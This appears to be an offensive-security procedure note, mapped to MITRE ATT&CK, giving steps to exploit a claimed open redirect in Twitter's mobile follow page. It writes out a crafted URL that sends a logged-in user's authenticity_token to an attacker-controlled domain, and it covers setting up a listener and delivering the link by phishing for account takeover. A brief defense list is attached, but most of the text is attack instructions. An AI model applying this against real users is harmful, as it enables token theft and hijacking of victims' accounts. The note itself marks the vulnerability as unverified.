---
id: b2c3d4e5-f6g7-8901-bcde-f23456789012
tags:
  - open-redirect
  - url-crafting
  - twitter
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:24:26.564Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Craft-Malicious-URL-for-Twitter-Follow-Open-Redirect

## Summary

This procedure involves constructing a malicious URL that exploits the open redirect vulnerability in Twitter's mobile messaging follow feature, setting the stage for token leakage by directing POST requests to an attacker-controlled domain.

## Description

The Twitter mobile web app at https://mobile.twitter.com/messages/follow allows the 'recipient' parameter to accept arbitrary external domains without validation. By setting recipient to a path like /example.com, where example.com is attacker-controlled, clicking 'Follow' sends a POST request with the user's authenticity_token to that domain. This is useful in phishing campaigns targeting logged-in Twitter users for credential theft leading to account takeover.

## Requirements

1. Control over a domain/server to receive POST requests (e.g., set up a simple HTTP listener)
2. Knowledge of the victim's logged-in state on Twitter mobile
3. Social engineering vector to deliver the URL (email, SMS, etc.)

## Defense

Defensive measures and detection strategies:

- Validate and whitelist redirect domains in URL parameters
- Implement CSRF token binding to prevent leakage in cross-origin requests
- Monitor for anomalous POST requests to external domains from internal features

## Objectives

1. Create a functional malicious URL for the open redirect
2. Ensure the URL loads the Twitter follow interface without errors
3. Prepare for token capture in subsequent steps

## Instructions

### Step 1: Identify Attacker Domain

**Context**: Set up or select a domain under your control to receive the leaked token via POST.

No command required; configure a web server (e.g., using Python's http.server) to log incoming requests.

> Expected: Server listening on https://example.com/ ready to capture POST data.

### Step 2: Construct the Malicious URL

**Context**: Build the URL using the vulnerable endpoint and your domain in the recipient parameter.

Use a text editor or browser console to craft:

```url
https://mobile.twitter.com/messages/follow?recipient=/example.com
```

> Replace /example.com with your controlled domain path. This URL, when visited by a logged-in user, will attempt to follow "example.com" but redirect the POST to your server.

### Step 3: Test the URL

**Context**: Verify the URL loads correctly without triggering errors.

Visit the URL in a browser while logged into Twitter mobile. Observe if the follow button appears.

> Expected: Follow interface loads; no redirect validation errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- open-redirect
- url-crafting
